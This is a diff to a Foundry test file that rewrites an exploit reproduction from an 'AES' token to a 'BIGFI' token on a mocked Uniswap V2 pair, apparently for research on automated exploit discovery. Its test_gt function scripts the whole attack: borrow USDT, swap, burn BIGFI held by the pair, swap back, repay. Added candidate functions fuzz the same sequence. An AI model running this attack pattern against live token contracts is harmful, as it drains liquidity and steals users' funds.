@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-import "./AES.sol";
 import "./AttackContract.sol";
+import "./BIGFI.sol";
 import "@utils/QueryBlockchain.sol";
 import "forge-std/Test.sol";
 import {USDT} from "@utils/USDT.sol";
@@ -9,8 +9,8 @@ import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
 import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
 import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
 
-contract AESTest is Test, BlockLoader {
-    AES aes;
+contract BIGFITest is Test, BlockLoader {
+    BIGFI bigfi;
     USDT usdt;
     UniswapV2Pair pair;
     UniswapV2Factory factory;
@@ -18,48 +18,44 @@ contract AESTest is Test, BlockLoader {
     AttackContract attackContract;
     address owner;
     address attacker;
-    address aesAddr;
+    address bigfiAddr;
     address usdtAddr;
     address pairAddr;
     address factoryAddr;
     address routerAddr;
     address attackerAddr;
-    uint256 blockTimestamp = 1670403423;
-    uint112 reserve0pair = 64026931732834970073285;
-    uint112 reserve1pair = 3976072419420817555481090;
-    uint32 blockTimestampLastpair = 1670402979;
-    uint256 kLastpair = 250000000000000000000000000000000000000000000000;
-    uint256 price0CumulativeLastpair = 8186339539916590645979676076811473439021;
-    uint256 price1CumulativeLastpair = 1309036025684247482259206283363904562;
-    uint256 totalSupplyaes = 80966356010303897340499440;
-    uint256 balanceOfaespair = 3976072419420817555481090;
-    uint256 balanceOfaesattacker = 0;
-    uint256 balanceOfaes = 0;
-    uint256 totalSupplyusdt = 3179997922170098408283525081;
-    uint256 balanceOfusdtpair = 64026931732834970073285;
+    uint256 blockTimestamp = 1679488640;
+    uint112 reserve0pair = 107480664198219600542112;
+    uint112 reserve1pair = 9310990259680030849404;
+    uint32 blockTimestampLastpair = 1679487323;
+    uint256 kLastpair = 1000000000000000000000000000000000000000000000;
+    uint256 price0CumulativeLastpair = 9331442367350366394946020654225776954;
+    uint256 price1CumulativeLastpair = 1315530319223280483996667964146207787633;
+    uint256 totalSupplybigfi = 20999968897118620381698369;
+    uint256 balanceOfbigfipair = 9310990259680030849404;
+    uint256 balanceOfbigfiattacker = 0;
+    uint256 totalSupplyusdt = 3179997916256874581285982200;
+    uint256 balanceOfusdtpair = 107480664198219600542112;
     uint256 balanceOfusdtattacker = 0;
-    uint256 balanceOfusdt = 0;
 
     function setUp() public {
         owner = address(this);
-        aes = new AES(
-            "AES",
-            "AES",
-            address(usdt),
-            [
-                0xEb55526075eC7797d5CdcF4C3263fA39004B958D,
-                0x05DE4Ea6D2472EB569B55e6A1Ada52d2a451d854,
-                0x7c31f5c790CeA93d83aD94F92037Abc1c0d5740d,
-                0x3E1BA8607304EdC3d26eA6Fba67C09cEb2890AcA,
-                0x3777aeec31907057c16F0b4dDC34A6B0a5dC53b6
-            ]
+        bigfi = new BIGFI(
+            owner,
+            "Big finance",
+            "BIGFI",
+            18,
+            10000e18,
+            [1, 1, 1],
+            [uint256(4), uint256(4), uint256(4), uint256(50)],
+            0x602546D439EA254f3372c3985840750C6B9c6dDB
         );
-        aesAddr = address(aes);
+        bigfiAddr = address(bigfi);
         usdt = new USDT();
         usdtAddr = address(usdt);
         pair = new UniswapV2Pair(
             address(usdt),
-            address(aes),
+            address(bigfi),
             reserve0pair,
             reserve1pair,
             blockTimestampLastpair,
@@ -82,8 +78,7 @@ contract AESTest is Test, BlockLoader {
         attacker = address(attackContract);
         // Initialize balances and mock flashloan.
         usdt.transfer(address(pair), balanceOfusdtpair);
-        aes.transfer(address(pair), balanceOfaespair);
-        aes.afterDeploy(address(router), address(pair));
+        bigfi.transfer(address(pair), balanceOfbigfipair);
     }
 
     modifier eurus() {
@@ -98,11 +93,23 @@ contract AESTest is Test, BlockLoader {
             address(usdt),
             usdt.decimals()
         );
-        queryERC20BalanceDecimals(address(aes), address(usdt), aes.decimals());
+        queryERC20BalanceDecimals(
+            address(bigfi),
+            address(usdt),
+            bigfi.decimals()
+        );
         emit log_string("");
-        emit log_string("Aes Balances: ");
-        queryERC20BalanceDecimals(address(usdt), address(aes), usdt.decimals());
-        queryERC20BalanceDecimals(address(aes), address(aes), aes.decimals());
+        emit log_string("Bigfi Balances: ");
+        queryERC20BalanceDecimals(
+            address(usdt),
+            address(bigfi),
+            usdt.decimals()
+        );
+        queryERC20BalanceDecimals(
+            address(bigfi),
+            address(bigfi),
+            bigfi.decimals()
+        );
         emit log_string("");
         emit log_string("Pair Balances: ");
         queryERC20BalanceDecimals(
@@ -110,7 +117,11 @@ contract AESTest is Test, BlockLoader {
             address(pair),
             usdt.decimals()
         );
-        queryERC20BalanceDecimals(address(aes), address(pair), aes.decimals());
+        queryERC20BalanceDecimals(
+            address(bigfi),
+            address(pair),
+            bigfi.decimals()
+        );
         emit log_string("");
         emit log_string("Attacker Balances: ");
         queryERC20BalanceDecimals(
@@ -119,9 +130,9 @@ contract AESTest is Test, BlockLoader {
             usdt.decimals()
         );
         queryERC20BalanceDecimals(
-            address(aes),
+            address(bigfi),
             address(attacker),
-            aes.decimals()
+            bigfi.decimals()
         );
         emit log_string("");
         emit log_string("");
@@ -143,15 +154,15 @@ contract AESTest is Test, BlockLoader {
         usdt.transfer(owner, amount);
     }
 
-    function borrow_aes_owner(uint256 amount) internal eurus {
+    function borrow_bigfi_owner(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(owner);
-        aes.transfer(attacker, amount);
+        bigfi.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
 
-    function payback_aes_owner(uint256 amount) internal eurus {
-        aes.transfer(owner, amount);
+    function payback_bigfi_owner(uint256 amount) internal eurus {
+        bigfi.transfer(owner, amount);
     }
 
     function borrow_usdt_pair(uint256 amount) internal eurus {
@@ -165,18 +176,18 @@ contract AESTest is Test, BlockLoader {
         usdt.transfer(address(pair), amount);
     }
 
-    function borrow_aes_pair(uint256 amount) internal eurus {
+    function borrow_bigfi_pair(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(address(pair));
-        aes.transfer(attacker, amount);
+        bigfi.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
 
-    function payback_aes_pair(uint256 amount) internal eurus {
-        aes.transfer(address(pair), amount);
+    function payback_bigfi_pair(uint256 amount) internal eurus {
+        bigfi.transfer(address(pair), amount);
     }
 
-    function swap_pair_attacker_usdt_aes(
+    function swap_pair_attacker_usdt_bigfi(
         uint256 amount,
         uint256 amountOut
     ) internal eurus {
@@ -184,36 +195,74 @@ contract AESTest is Test, BlockLoader {
         pair.swap(0, amountOut, attacker, new bytes(0));
     }
 
-    function swap_pair_attacker_aes_usdt(
+    function swap_pair_attacker_bigfi_usdt(
         uint256 amount,
         uint256 amountOut
     ) internal eurus {
-        aes.transfer(address(pair), amount);
+        bigfi.transfer(address(pair), amount);
         pair.swap(amountOut, 0, attacker, new bytes(0));
     }
 
-    function burn_aes_pair(uint256 amount) internal eurus {
-        aes.distributeFee();
+    function burn_bigfi_pair(uint256 amount) internal eurus {
+        bigfi.burn(address(pair), amount);
         pair.sync();
+    }
+
+    function check_cand000(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= (amt0 * 1003) / 1000);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_bigfi(amt1, amt2);
+        swap_pair_attacker_bigfi_usdt(amt3, amt4);
+        payback_usdt_owner(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand001(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= (amt0 * 1003) / 1000);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_bigfi(amt1, amt2);
+        burn_bigfi_pair(amt3);
+        swap_pair_attacker_bigfi_usdt(amt4, amt5);
+        payback_usdt_owner(amt6);
+        assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_usdt_owner(100000e18);
+        borrow_usdt_owner(200000e18);
         printBalance("After step0 ");
-        swap_pair_attacker_usdt_aes(
+        swap_pair_attacker_usdt_bigfi(
             usdt.balanceOf(attacker),
             pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
         );
         printBalance("After step1 ");
-        burn_aes_pair(0);
+        burn_bigfi_pair(3260e18);
         printBalance("After step2 ");
-        swap_pair_attacker_aes_usdt(
-            aes.balanceOf(attacker),
-            pair.getAmountOut(aes.balanceOf(attacker), address(aes))
+        swap_pair_attacker_bigfi_usdt(
+            bigfi.balanceOf(attacker),
+            pair.getAmountOut(bigfi.balanceOf(attacker), address(bigfi))
         );
         printBalance("After step3 ");
-        payback_usdt_owner((100000e18 * 1003) / 1000);
+        payback_usdt_owner(200600e18);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
@@ -231,9 +280,9 @@ contract AESTest is Test, BlockLoader {
         vm.startPrank(attacker);
         vm.assume(amt6 >= (amt0 * 1003) / 1000);
         borrow_usdt_owner(amt0);
-        swap_pair_attacker_usdt_aes(amt1, amt2);
-        burn_aes_pair(amt3);
-        swap_pair_attacker_aes_usdt(amt4, amt5);
+        swap_pair_attacker_usdt_bigfi(amt1, amt2);
+        burn_bigfi_pair(amt3);
+        swap_pair_attacker_bigfi_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
         assert(!attackGoal());
         vm.stopPrank();
